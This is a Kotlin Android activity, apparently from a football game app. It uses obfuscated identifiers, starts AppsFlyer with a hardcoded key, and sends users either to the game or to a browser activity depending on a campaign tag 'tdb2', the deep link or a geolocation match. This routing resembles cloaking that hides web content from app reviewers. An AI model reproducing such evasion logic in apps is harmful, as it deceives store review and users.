package com.gamegou.footbally

import android.content.Intent
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import com.gamegou.footbally.ApppliacttionClass.Companion.appsCheckfrr
import com.gamegou.footbally.ApppliacttionClass.Companion.countryCodefrrfr
import com.gamegou.footbally.ApppliacttionClass.Companion.geomeo
import com.gamegou.footbally.databinding.ActivityAsfActtttttttAcctBinding
import com.orhanobut.hawk.Hawk
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.gamegou.footbally.ApppliacttionClass.Companion.C1gttg
import com.gamegou.footbally.ApppliacttionClass.Companion.DEEPLfrfr


class AsfActtttttttAcct : AppCompatActivity() {
    lateinit var bindAsffrffrr: ActivityAsfActtttttttAcctBinding

    private fun intLONEfrfrrf() {
        val intenttgtgtt = Intent(this@AsfActtttttttAcct, GaaaameeeHooldeerActivity::class.java)
        Hawk.put(geomeo, null)
        Hawk.put(countryCodefrrfr, null)
        Hawk.put(appsCheckfrr, null)
        startActivity(intenttgtgtt)
        finish()
    }

    private fun intWEdrfrrf() {
        val intentfrfrrf = Intent(this@AsfActtttttttAcct, BrovvvssserActivity::class.java)
        Hawk.put(geomeo, null)
        Hawk.put(countryCodefrrfr, null)
        Hawk.put(appsCheckfrr, null)
        startActivity(intentfrfrrf)
        finish()
    }

    override fun onCreate(savedInstanceState: Bundle?) {

        super.onCreate(savedInstanceState)
        bindAsffrffrr = ActivityAsfActtttttttAcctBinding.inflate(layoutInflater)
        setContentView(bindAsffrffrr.root)

        val appsChfrffrrf: String? = Hawk.get(appsCheckfrr, "null")

        if (appsChfrffrrf == "1") {
            AppsFlyerLib.getInstance()
                .init("BrT5KSpPeaEcduDRgNFHgj", frfrfrpl, applicationContext)
            AppsFlyerLib.getInstance().start(this)
        }

        folkfrrrf()

    }

    private val frfrfrpl = object : AppsFlyerConversionListener {
        override fun onConversionDataSuccess(data: MutableMap<String, Any>?) {
            val dataGotten = data?.get("campaign").toString()
            Hawk.put(C1gttg, dataGotten)
        }
        override fun onConversionDataFail(p0: String?) {}
        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {}
        override fun onAttributionFailure(p0: String?) {}
    }


    private fun folkfrrrf() {

        val ftgtgttg: String = Hawk.get(geomeo)
        val countyCfrfrrfrf: String = Hawk.get(countryCodefrrfr, "null")

        val deeplinkgtgttg: String? = Hawk.get(DEEPLfrfr, "null") //здесь нужен дефолтный ноль
        val appsChfrfgtg: String? = Hawk.get(appsCheckfrr, "null")
        var namingfrfrrr: String? = Hawk.get(C1gttg)

        if (appsChfrfgtg == "1") {
            val executorService = Executors.newSingleThreadScheduledExecutor()
            executorService.scheduleAtFixedRate({
                if (namingfrfrrr != null) {

                    if (namingfrfrrr!!.contains("tdb2") || ftgtgttg.contains(countyCfrfrrfrf) || deeplinkgtgttg!!.contains("tdb2")) {
                        executorService.shutdown()
                        intWEdrfrrf()
                    } else {
                        executorService.shutdown()
                        intLONEfrfrrf()
                    }
                } else {
                    namingfrfrrr = Hawk.get(C1gttg)
                }
            }, 0, 1, TimeUnit.SECONDS)
        }  else if (ftgtgttg.contains(countyCfrfrrfrf)) {
            intWEdrfrrf()
        } else {
            intLONEfrfrrf()
        }

    }


}